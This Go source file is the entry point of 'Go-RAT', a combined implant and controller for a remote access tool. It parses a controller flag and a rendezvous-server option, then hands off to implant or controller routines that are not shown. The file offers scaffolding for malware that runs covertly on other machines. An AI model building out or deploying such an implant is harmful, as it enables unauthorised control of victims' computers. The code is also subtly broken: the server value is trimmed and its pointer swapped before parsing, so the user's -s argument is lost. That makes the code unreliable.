package main

import (
	"fmt"
	"github.com/akamensky/argparse"
	"os"
	"strconv"
	"strings"
)

func doModeTransition() {
	config := GetGlobalConfig()

	controllerMode, err := strconv.ParseBool(config.Get("controllerMode"))

	if err != nil {
		panic("Cannot handle config value format.")
	}

	if controllerMode {
		runAsController()
	} else {
		runAsImplant()
	}

}

func main() {
	fmt.Println("Launching Go-RAT.\n")

	// Argument parser
	desc := "Combined implant and controller for go-rat: Remote Access Tool."
	parser := argparse.NewParser("go-rat", desc)

	// Arguments
	controllerMode := parser.Flag("c", "controller",
		&argparse.Options{Help: "Pass this flag to run in controller mode, else run as implant."})
	rendezvousServer := parser.String("s", "server",
		&argparse.Options{Help: "Initial rendezvous server, if any, to reach out to as either the implant or controller."})

	trimmedStr := strings.TrimSpace(*rendezvousServer)
	rendezvousServer = &trimmedStr

	// Parse
	err := parser.Parse(os.Args)
	if err != nil {
		// In case of error print error and print usage
		// This can also be done by passing -h or --help flags
		fmt.Print(parser.Usage(err))
		return
	}

	// Update config based on command line options
	config := GetGlobalConfig()
	config.Set("controllerMode", strconv.FormatBool(*controllerMode))
	if len(*rendezvousServer) != 0 {
		config.Set("rendezvousServer", *rendezvousServer)
	}

	fmt.Println("Config:")
	fmt.Println(config)

	doModeTransition()

}
